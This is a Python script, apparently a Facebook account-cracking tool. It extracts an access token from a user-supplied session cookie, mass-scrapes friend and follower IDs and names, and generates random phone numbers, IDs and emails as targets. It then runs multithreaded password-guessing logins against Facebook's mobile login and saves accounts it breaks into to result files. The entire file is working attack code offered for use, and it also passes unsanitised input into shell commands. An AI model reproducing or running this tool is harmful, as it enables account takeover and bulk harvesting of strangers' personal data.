#-!/bin/python3.10.5
# coding _-_udf:8_-_
# made by : 
###----------[ EXTERNAL IMPORTING MODULE ]---------- ###
import sys,platform,os,time
try:
	import requests
except ModuleNotFoundError:
	print("[*] Installing Module requests")
	os.system("python3 -m pip install requests &> /dev/null")
try:
	import bs4
except ModuleNotFoundError:
	print("[*] Installing Module bs4")
	os.system("python3 -m pip install bs4 &> /dev/null")
try:
	import mechanize
except ModuleNotFoundError:
	print("[*] Install Module mechanize")
	os.system("python3 -m pip install mechanize &> /dev/null")
###----------[ TERNAL IMPORTING MODULE ]---------- ###
from os import system as cmd
from time import sleep as slp
import requests,random,sys,json,os,re,datetime,calendar
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,mechanize
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
#-----------[ ADDITIONAL MODULE ]-------->>
import random,hashlib,re,threading
import json,urllib,time,datetime
import uuid,ipaddress,calendar,subprocess
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
###---------[ EMPTY LOOP ]------->>
totaldmp = 0
count = 0
loop = 0
###---------[ EMPTY LIST ]------->>
oks = []
cps = []
tls = []
user=[]
###---------[ FUNCTION CREATE DATE ]------->>
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
alldatexx = ("%s/%s/%s"%(cday, months, year))
###---------[ RESULT CRACKED SAVED FILE ]------->>
file_cp = 'result/CP/CP-'+alldate+'.txt'
file_ok = 'result/OK/OK-'+alldate+'.txt'
###---------[ USERAGENT LIST ]------->>
list_useragent = ["Mozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"]
###---------[ PRINT COLOUR ]------->>
white  =  '\x1b[1;97m'
rad	=  '\x1b[1;91m'
green  =  '\x1b[1;92m'
yellow =  '\x1b[1;93m'
blue   =  '\x1b[1;94m'
orange =  '\x1b[1;95m'
###--------[ CLEAR TERMINAL SCREEN ]----->>
def clear_screen(time_sleep=0.5):
	import os
	from time import sleep as slp
	if "linux" in sys.platform.lower():
		try:
			slp(time_sleep)
			os.system("clear")
		except:
			pass
	elif "win" in sys.platform.lower():
		try:
			slp(time_sleep)
			os.system("cls")
		except:
			pass
	else:
		try:
			slp(time_sleep)
			os.system("clear")
		except:
			pass
###--------[ TEXT ANIMATION ]-----*
def type_text(text,time_sleep=0.09):
	import time
	for e in text + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(time_sleep)
###---------[ CREATE FILE MP3 ]------->
def create_audio(text,file):
	from gtts import gTTS
	my_a = gTTS(text)
	my_a.save(file)
###---------[ PLAY AUDIO ]----------->
def play_audio(audio_file):
	from os import system as cmd
	try:
		cmd("play-audio "+audio_file)
	except:
		pass
###---------[ COOKIE LOGIN ]----------->>
def login():
	logo()
	try:
		fbcokis= input('[*] Input Your Facebook Cookie : ')
		head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
		open("data/token.txt", "w").write(eaag.group(1))
		open("data/cookie.txt", "w").write(fbcokis)
		token = open('data/token.txt','r').read()
		info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
		menu()
	except Exception as e:
		os.system("rm -f data/token.txt")
		print(f"Error {e}")
		slp(2)
		login()
###---------[ GREP FUNCTION ]----------->>
def grep(f):
	o = input('\033[0;97m[->] Save As : ')
	try:
		ask_link = int(input('\n[->] Enter Grip ID Limit : '))
	except:
		ask_link = 1
		completed = 0
	for links in range(ask_link):
		li = input('[*] Separate Object : ')
		os.system('cat '+f+' | grep "'+li+'" >> '+o)
	print("")
	print("[->] Separating Successful ")
	print("[->] New File Save " + o)
	input("\n[>>] Press Inter to go Back < ")
	menu()
###---------[ AUTO DUMP PUBLIC ]----------->>
def public_dump_auto():
	fbidz = []
	logo()
	global totaldmp,count
	try:
		fbcokis = open("data/cookie.txt", "r").read()
		token = open("data/token.txt","r").read()
	except FileNotFoundError:
		print("\x1b[1;91m Cookie Expire ")
		slp(1)
		cmd('rm -rf data/token.txt')
		login()
	try:
		cmd('clear')
		logo()
		try:
			fbbuid = input("[*] Enter Public ID Link : ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				fbidz.append(idnm['id'])
		except KeyError:
			print("\n\x1b[1;91m[!] ID Not Public")
			menu()
		filepath = input("\n[*] Enter File Path : ")
		print('\n\n')
		apnd = open(filepath,'w')
		for fbuid in fbidz:
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\x1b[1;92m[*] Dumping UID From : " + fbuid)
			except KeyError:
				print('\x1b[1;91m[*] Dumping UID From : ' + fbuid)
		apnd.close()
		print('\n\x1b[1;97m')
		ch_x1 = input("[*] DoYou Want to Use DuplicateID Cuter (n/y) : ")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			newfile = input("\n[*] File Without Duplicate ID Save As : ")
			os.system('sort -r '+filepath+' | uniq >> '+newfile)
			ch_x2 = input("\n[*] DoYou Want to Use ID Separator (n/y) : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(newfile)
			else:
				print(47*'-')
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print(47*'-')
				print('\n')
				input("\n[*] Press Inter to go Back < ")
				menu()
		else:
			print('\n')
			ch_x2 = input("[*] Do You Want to Use ID Separator (n/y) : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(filepath)
			else:
				print(47*'-')
				print (f"\x1b[0;37m Total ID Dump :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {filepath} ")
				print(47*'-')
				input("\n[*] Press Inter to go Back < ")
				menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###---------[ SINGLE PUBLIC DUMP ]------->>
def public_single_dump():
	logo()
	global totaldmp,count
	try:
		token=open('data/token.txt','r').read()
		fbcokis = open("data/cookie.txt","r").read()
	except FileNotFoundError:
		print("[*] Saved Token/Cookie File Not Found")
		slp(1)
		login()
	try:
		cmd('clear')
		logo()
		try:
			fbbuid = input("[->] Enter Public ID Link : ")
			savedfile = input("[->] Enter UID File Save As : ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			apnd = open(savedfile,'w')
			for idnm in dmp['friends']['data']:
				totaldmp += 1
				apnd.write(idnm['id']+'|'+idnm['name']+'\n')
		except KeyError:
			print("\n[*] Public ID Error [ KeyError ]")
			menu()
		apnd.close()
		print(f"\n\n[>>] Total UID Save As : {green}{totaldmp}{white}")
		print(f"[>>] File Save As : {green}{savedfile}{white}")
		input("[*] Press Inter to go Back < ")
		menu()
	except Exception as e:
		print(f"[*] Error {e}")
		slp(2)
		menu()
##---------[ MULTI PUBLIC DUMP ]------->>>
def public_multi_dump():
			logo()
			global totaldmp,count
			try:
				token=open('data/token.txt','r').read()
				fbcokis = open("data/cookie.txt","r").read()
			except FileNotFoundError:
				print("[*] Saved Token/Cookie File Not Found")
				slp(1)
				login()
			try:
				cmd('clear')
				logo()
				try:
					savedfile = input("[->] Enter UID File Save As : ")
					limit = int(input("\n[->] Enter Total Dump limit : "))
				except:
					print("[*] Wrong input Value ")
					time.sleep(2)
					menu()
				try:
					for a in range(limit):
						fbbuid = input(f"[->] Enter Public ID Link {a} : ")
						dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
						apnd = open(savedfile,'w')
						for idnm in dmp['friends']['data']:
							totaldmp += 1
							apnd.write(idnm['id']+'|'+idnm['name']+'\n')
				except KeyError:
					print("\n[*] Public ID Error [ KeyError ]")
					menu()
				apnd.close()
				print(f"\n\n[>>] Total UID Save As : {green}{totaldmp}{white}")
				print(f"[>>] File Save As : {green}{savedfile}{white}")
				input("[*] Press Inter to go Back < ")
				menu()
			except Exception as e:
				print(f"[*] Error {e}")
				slp(2)
				menu()
###---------[ AUTO DUMP PUBLIC FORM FILE ]-----------*
def public_dump_autofrom_file():
	fbidz = []
	logo()
	global totaldmp,count
	try:
		fbcokis = open("data/cookie.txt", "r").read()
		token = open("data/token.txt","r").read()
	except FileNotFoundError:
		print("\x1b[1;91m Cookie Expire ")
		slp(1)
		login()
	try:
		cmd('clear')
		logo()
		try:
			filepath = input("[*] Enter Already Stored File UID : ")
			filedata2 = open(filepath,'r').read()
			filedata = filedata2.splitlines()
		except KeyError:
			print("[->] File Not Found ")
			slp(2)
			menu()
		filepath = input("\n[*] Enter New File Path : ")
		print('\n\n')
		apnd = open(filepath,'w')
		for fxb in filedata:
			fbuid, name = fxb.split('|')
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\x1b[1;92m[*] Dumping UID From : " + fbuid)
			except KeyError:
				print('\x1b[1;91m[*] Dumping UID From : ' + fbuid)
		apnd.close()
		print('\n\x1b[1;97m')
		ch_x1 = input("[*] DoYou Want to Use DuplicateID Cuter (n/y) : ")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			newfile = input("\n[*] File Without Duplicate ID Save As : ")
			os.system('sort -r '+filepath+' | uniq >> '+newfile)
			ch_x2 = input("\n[*] DoYou Want to Use ID Separator (n/y) : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(newfile)
			else:
				print(47*'-')
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print(47*'-')
				print('\n')
				input("\n[*] Press Inter to go Back < ")
				menu()
		else:
			print('\n')
			ch_x2 = input("[*] Do You Want to Use ID Separator (n/y) : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(filepath)
			else:
				print(47*'-')
				print (f"\x1b[0;37m Total ID Dump :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {filepath} ")
				print(47*'-')
				input("\n[*] Press Inter to go Back < ")
				menu()
	except Exception as e:
		print("[*] error : %s"%e)
		exit("")
###---------[ SINGLE FOLLOWER DUMP ]------->>
def followers_single_dump():
	logo()
	global totaldmp,count
	try:
		token=open('data/token.txt','r').read()
		fbcokis = open("data/cookie.txt","r").read()
	except FileNotFoundError:
		print("[*] Saved Token/Cookie File Not Found")
		slp(1)
		login()
	try:
		cmd('clear')
		logo()
		try:
			fbbuid = input("[->] Enter Follower ID Link : ")
			savedfile = input("[->] Enter UID File Save As : ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=name,subscribers.fields(id,name).limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			apnd = open(savedfile,'w')
			for idnm in dmp['subscribers']['data']:
				totaldmp += 1
				apnd.write(idnm['id']+'|'+idnm['name']+'\n')
		except KeyError:
			print("\n[*] Follower ID Error [ KeyError ]")
			menu()
		apnd.close()
		print(f"\n\n[>>] Total UID Save As : {green}{totaldmp}{white}")
		print(f"[>>] File Save As : {green}{savedfile}{white}")
		input("[*] Press Inter to go Back < ")
		menu()
	except Exception as e:
		print(f"[*] Error {e}")
		slp(2)
		menu()
##---------[ MULTI FOLLOWER DUMP ]------->>>
def followers_multi_dump():
	logo()
	global totaldmp,count
	try:
		token=open('data/token.txt','r').read()
		fbcokis = open("data/cookie.txt","r").read()
	except FileNotFoundError:
		print("[*] Saved Token/Cookie File Not Found")
		slp(1)
		login()
	try:
		cmd('clear')
		logo()
		try:
			savedfile = input("[->] Enter UID File Save As : ")
			limit = int(input("\n[->] Enter Total Dump limit : "))
		except:
			print("[*] Wrong input Value ")
			time.sleep(2)
			menu()
		try:
			for a in range(limit):
				fbbuid = input(f"[->] Enter Follower ID Link {a} : ")
				dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=name,subscribers.fields(id,name).limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				apnd = open(savedfile,'w')
				for idnm in dmp['subscribers']['data']:
					totaldmp += 1
					apnd.write(idnm['id']+'|'+idnm['name']+'\n')
		except KeyError:
			print("\n[*] Follower ID Error [ KeyError ]")
			menu()
		apnd.close()
		print(f"\n\n[>>] Total UID Save As : {green}{totaldmp}{white}")
		print(f"[>>] File Save As : {green}{savedfile}{white}")
		input("[*] Press Inter to go Back < ")
		menu()
	except Exception as e:
		print(f"[*] Error {e}")
		slp(2)
		menu()
###---------[ LOGO PROGRAMME ]------->>
def logo():
	clear_screen()
	print(" ")
###---------[ DIRECR RANDOM NUMBER ]------->>
def direct_random_number():
	logo()
	user=[]
	print('[*] Enter any country number without + ')
	print('\t\t\tExample: ')
	print('[*] Pakistan  :  923445440881')
	print('[*] Indea	 :  918006816329')
	print('[*] Bangladesh : 8801916271256')
	user_number = input('\n[->] Enter any mobile number : ')
	if len(user_number)==12:
		kode = user_number[:5]
	elif len(user_number)==13:
	    kode = user_number[:6]
	else:
		print(f"[*] Wrong Number input {user_number}")
		exit("")
	limit = int(input('[->] Enter Dump Limit : '))
	if (limit)>5000:
		limit=5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as startcrack:
		tl = str(len(user))
		print('\n-------------------------------------------------------')
		print("[*] Process has been started\n[*] On and Of Airplain mode \n[*] To stop process press Ctrl + Z")
		print('-------------------------------------------------------')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			startcrack.submit(rcrack,uid,pwx,tl)
###--------[ RANDOM NUMBER TO UID CRACK ]----->
def rcrack(uid,pwx,tl):
	global loop
	global cps
	global oks
	global tls
	global file_ok
	global file_cp
	global list_useragent
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(list_useragent)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
			'accept-encoding':'utf-8',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': "Mozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"}
			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?api_key=124024574287414&skip_api_login=1&signed_next=1&next=https://m.facebook.com/dialog/oauth?app_id=124024574287414&refsrc=deprecated&app_id=124024574287414&lwv=100&refid=9',data=log_data,headers=header_freefb).text			
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[OK] '+cid+' | '+ps)
				open(file_ok, 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif '/x/checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;33m[TL] '+cid+' | '+ps )
				tls.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[CP] '+cid+' | '+ps )
				open(file_cp, 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		code = uid[:2]+"**"+uid[4:10]
		sys.stdout.write('\r\33[1;37m%s/%s|\33[1;97mOK/CP/TF/TL:%s/%s/0/%s '%(tl,loop,len(oks),len(cps),len(tls))),
		sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		time.sleep(10)
###--------[ MOBILE NUMBER DUMP ]------->
def dump_number_forcrack():
	try:
		logo()
		user=[]
		print('[*] Enter any country number without + ')
		print('\t\t\tExample: ')
		print('[*] Pakistan  :  923445440881')
		print('[*] Indea	 :  918006816329')
		user_number = input('\n[->] Enter any mobile number : ')
		file_save = input('[->] Enter Dump File Save As : ')
		if len(user_number)==12:
			kode = user_number[:5]
		elif len(user_number)==13:
		    kode = user_number[:6]
		else:
			print(f"[*] Wrong Number input {user_number}")
			exit("")
		limit = int(input('[->] Enter Dump Limit : '))
		if (limit)>5000:
		   limit=5000
		kode = user_number[:5]
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		dumpp = open(file_save,'w')
		for guru in user:
			uid = kode+guru
			dumpp.write(uid+'|'+guru+'\n')
			print(uid+'|'+guru)
			time.sleep(0.005)
		dumpp.close()
		print('\n-------------------------------------------------------')
		print(f"[*] Dumping Successful \n[*] Dump File Save As : {green}{file_save}{white}")
		print('---------------------------------------------------------')
		input('\n[>>] Press enter to go back :/ ')
		menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###--------[ RANDOM UID NEW DUMP ]------->
def dump_Random_new():
	try:
		logo()
		user=[]
		print('[*] Enter First 6 digit of any UID')
		print('[*] 100000   100010   100020   100030   100040')
		print('[*] 100060   100070   100080   100090   100100')
		user_uid = input('\n[->] Enter UID Digit : ')
		file_save = input('[->] Enter Dump File Save As : ')
		if len(user_uid)==6:
			kode = user_uid
		elif len(user_uid)>6:
			kode = user_uid[:6]
		else:
			print("[>>] Wrong Input Value ")
			time.sleep(2)
			menu()
		limit = int(input('[->] Enter Dump Limit : '))
		if (limit)>5000:
		   limit=5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(9))
			user.append(nmp)
		dumpp = open(file_save,'w')
		for guru in user:
			uid = kode+guru
			dumpp.write(uid+'|Abc Def Ghi\n')
			print(uid+'|Abc Def Ghi')
			time.sleep(0.005)
		dumpp.close()
		print('\n-------------------------------------------------------')
		print(f"[*] Dumping Successful \n[*] Dump File Save As : {green}{file_save}{white}")
		print('---------------------------------------------------------')
		input('\n[>>] Press enter to go back :/ ')
		menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###--------[ RANDOM UID OLD DUMP ]------->
def dump_Random_old():
	try:
		logo()
		user=[]
		print('[*] 1000000   10000000   100000000 ')
		print('[*] 1000000000   10000000000 ')
		user_uid = input('\n[->] Enter UID Digit : ')
		file_save = input('[->] Enter Dump File Save As : ')
		if len(user_uid)==7:
			random_digits = 8
		elif len(user_uid)==8:
			random_digits = 7
		elif len(user_uid)==9:
			random_digits = 6
		elif len(user_uid)==10:
			random_digits = 5
		elif len(user_uid)==11:
			random_digits = 4
		elif len(user_uid)==12:
			random_digits = 3
		elif len(user_uid)==13:
			random_digits = 2
		else:
			print("[>>] Wrong Input Value ")
			time.sleep(2)
			menu()
		limit = int(input('[->] Enter Dump Limit : '))
		if (limit)>5000:
		   limit=5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(random_digits))
			user.append(nmp)
		dumpp = open(file_save,'w')
		for guru in user:
			kode = user_uid
			uid = kode+guru
			dumpp.write(uid+'|Abc Def Ghi\n')
			print(uid+'|Abc Def Ghi')
			time.sleep(0.005)
		dumpp.close()
		print('\n-------------------------------------------------------')
		print(f"[*] Dumping Successful \n[*] Dump File Save As : {green}{file_save}{white}")
		print('---------------------------------------------------------')
		input('\n[>>] Press enter to go back :/ ')
		menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###--------[ RANDOM UID MOST OLD DUMP ]------->
def dump_Random_mostold():
	try:
		logo()
		user=[]
		print('[*] 4digit ID Dump Enter : 4 or 8digit ID Dump Enter : 8')
		print('[*] 5digit IDDump Enter : 5 or 9digit ID Dump Enter : 9')
		print('[*] 6digit IDDump Enter : 6 or 10digit ID Dump Enter : 10')
		print('[*] 7digit IDDump Enter : 7 or 11digit ID Dump Enter : 11')
		user_uid = int(input('\n[->] Enter UID Digit : '))
		file_save = input('[->] Enter Dump File Save As : ')
		if user_uid in [3,4,5,6,7,8,9,10,11,12,13,14]:
			pass
		else:
			print("[>>] Wrong Input Value ")
			time.sleep(2)
			menu()
		limit = int(input('[->] Enter Dump Limit : '))
		if (limit)>5000:
		   limit=5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(user_uid))
			user.append(nmp)
		dumpp = open(file_save,'w')
		for guru in user:
			uid = guru
			dumpp.write(uid+'|Abc Def Ghi\n')
			print(uid+'|Abc Def Ghi')
			time.sleep(0.005)
		dumpp.close()
		print('\n-------------------------------------------------------')
		print(f"[*] Dumping Successful \n[*] Dump File Save As : {green}{file_save}{white}")
		print('---------------------------------------------------------')
		input('\n[>>] Press enter to go back :/ ')
		menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###--------[ RANDOM UID MOST OLD DUMP ]------->
def dump_email():
	try:
		logo()
		user=[]
		user_name_with_space = input('\n[->] Enter Any Name [i.e: Bilal ID] : ')
		file_save = input('[->] Enter Dump File Save As : ')
		random_digit = int(input("[->] Enter Digit In Email [i.e: 3 or 4] : "))
		email_domain = input("[->] Enter Domain [i.e: @gmail.com] : ")
		if random_digit in [3,4]:
			pass
		else:
			print("[>>] Wrong Input Value ")
			time.sleep(2)
			menu()
		limit = int(input('[->] Enter Dump Limit : '))
		if (limit)>5000:
		   limit=5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(random_digit))
			user.append(nmp)
		dumpp = open(file_save,'w')
		user_name = user_name_with_space.lower().replace(' ','')
		for guru in user:
			uid = user_name+guru+email_domain
			dumpp.write(uid+'|'+user_name_with_space+'\n')
			print(uid+'|'+user_name_with_space)
			time.sleep(0.005)
		dumpp.close()
		print('\n-------------------------------------------------------')
		print(f"[*] Dumping Successful \n[*] Dump File Save As : {green}{file_save}{white}")
		print('---------------------------------------------------------')
		input('\n[>>] Press enter to go back :/ ')
		menu()
	except Exception as e:
		print("[*] Error : %s"%e)
		exit("")
###--------[ GREAP MAIN FUNCTION/DEF ]------->
def greap_uid():
	logo()
	file = input("[->] Enter File UID : ")
	try:
		grep(file)
	except Exception as e:
		print(f"[*] Error {e} ")
		exit("")
###--------[ RANDOM FILE CRACK ]----->
def random_file_crack():
	logo()
	user=[]
	file_random = input('\n[->] Enter File For Crack : ')
	try:
		uids = open(file_random,'r').read().splitlines()
	except FileNotFoundError:
		print(f"[*] File Not Found Error Bro ")
		time.sleep(2)
		menu()
	pwd = input('[*] Enter Password [split: /",/"] : ')
	with ThreadPool(max_workers=30) as startcrack:
		tl = str(len(uids))
		print('\n-------------------------------------------------------')
		print("[*]Process has been started\n[*] On and Of Airplain mode \n[*] To stop process press Ctrl + Z")
		print('-------------------------------------------------------')
		for u_id in uids:
			pwx = pwd.split(",")
			uid,name = u_id.split('|')
			startcrack.submit(rcrack,uid,pwx,tl)
#--------[ MAIN MENU ]--------->>
def menu():
	logo()
	direct_random_number()




if __name__=='__main__':
	direct_random_number()